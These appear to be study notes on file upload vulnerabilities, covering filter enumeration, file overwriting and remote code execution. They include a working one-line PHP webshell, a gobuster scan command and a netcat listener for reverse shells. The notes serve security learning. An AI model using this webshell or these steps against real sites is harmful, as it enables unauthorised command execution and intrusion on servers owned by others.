Enumeration
-check if client-side filtering is being applied
-scan with gobuster
-use burpsuite and wappalyser
-if server-side filtering, need to guess what the filter is looking for, change based on error messages

Overwriting existing files: 
1. enumerate and find the src of image
2. upload an image with the same name

Remote Code Execution:
-written in the same language as the backend of the website (PHP, Python Django, Javascript Node.js)
-use webshells and reverse shells
-webshell if file length limit has been imposed on uploads
1. gobuster scan
gobuster dir -u http://example.com -w wordlist.txt
2. write a webshell
-PHP code takes GET parameter and executes it as a system command and echoes oupt to the screen
<?php
	echo system($_GET["cmd"]);
?>
3. reverse shells:
-netcat listener
nc -lvnp 1234
